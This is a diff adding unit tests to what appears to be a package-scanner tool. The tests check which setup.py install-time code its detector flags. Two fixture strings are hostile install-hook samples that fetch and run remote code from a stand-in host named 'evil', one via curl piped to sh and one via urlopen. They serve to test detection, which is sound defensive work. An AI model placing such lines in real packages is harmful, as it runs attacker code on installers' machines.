@@ -367,3 +367,83 @@ async def test_scan_published_artifact_fetch_error_fails_open():
     assert res.ok is False
     assert res.error
     assert res.findings == []
+
+
+# --- Validation fixes: guard-aware setup.py, benign version-exec, test-file skip,
+#     precise cmdclass, drift-only-when-compared ---------------------------------
+import hashlib as _hashlib  # noqa: E402
+
+from src.scanner.artifact_fetch import ArtifactFetchResult, ArtifactFile  # noqa: E402
+from src.scanner.artifact_scan import compute_drift, scan_artifact_files  # noqa: E402
+
+
+def _af(path: str, text: str) -> ArtifactFile:
+    raw = text.encode()
+    return ArtifactFile(
+        path=path, size=len(raw), sha256=_hashlib.sha256(raw).hexdigest(),
+        text=text, text_sha256=_hashlib.sha256(raw).hexdigest(), is_binary=False,
+    )
+
+
+def test_setup_py_guarded_publish_not_install_hook():
+    src = (
+        "import os, sys\n"
+        "if sys.argv[-1] == 'publish':\n    os.system('twine upload dist/*')\n    sys.exit()\n"
+        "setup(name='x')\n"
+    )
+    assert detect_pypi_install_exec(src, "setup.py") == []
+
+
+def test_setup_py_name_main_guard_not_install_hook():
+    src = "import os\nif __name__ == '__main__':\n    os.system('echo build')\n"
+    assert detect_pypi_install_exec(src, "setup.py") == []
+
+
+def test_setup_py_version_exec_is_benign():
+    src = (
+        "about = {}\n"
+        "with open('pkg/__about__.py') as f:\n    exec(f.read(), about)\n"
+        "setup(name='x', version=about['__version__'])\n"
+    )
+    assert detect_pypi_install_exec(src, "setup.py") == []
+
+
+def test_setup_py_unconditional_os_system_still_flagged():
+    src = "import os\nos.system('curl http://evil | sh')\nsetup(name='x')\n"
+    fs = detect_pypi_install_exec(src, "setup.py")
+    assert fs and fs[0].severity == "high" and fs[0].category == "install_hook"
+
+
+def test_setup_py_toplevel_urlopen_is_critical():
+    src = "from urllib.request import urlopen\nurlopen('http://evil/x').read()\n"
+    fs = detect_pypi_install_exec(src, "setup.py")
+    assert fs and fs[0].severity == "critical"
+
+
+def test_setup_py_cmdclass_test_only_not_flagged():
+    src = "setup(name='x', cmdclass={'test': PyTest})\n"
+    assert detect_pypi_install_exec(src, "setup.py") == []
+
+
+def test_artifact_scan_skips_test_files():
+    fetched = ArtifactFetchResult(
+        ecosystem="pypi", name="x", version="1.0", kind="sdist", ok=True,
+        files={
+            "tests/test_x.py": _af(
+                "tests/test_x.py", "import pickle\npickle.load(open('x', 'rb'))\n",
+            ),
+            "pkg/core.py": _af("pkg/core.py", "def add(a, b):\n    return a + b\n"),
+        },
+    )
+    findings, _scanned, _hook = scan_artifact_files(fetched)
+    assert not any("test" in (f.file_path or "") for f in findings)
+
+
+def test_drift_no_hook_finding_when_uncompared():
+    fetched = ArtifactFetchResult(
+        ecosystem="npm", name="x", version="1.0", kind="tarball", ok=True,
+        files={"index.js": _af("index.js", "module.exports = 1\n")},
+    )
+    drift, findings = compute_drift(fetched, None, None, has_install_hook=True)
+    assert drift["compared"] is False
+    assert findings == []
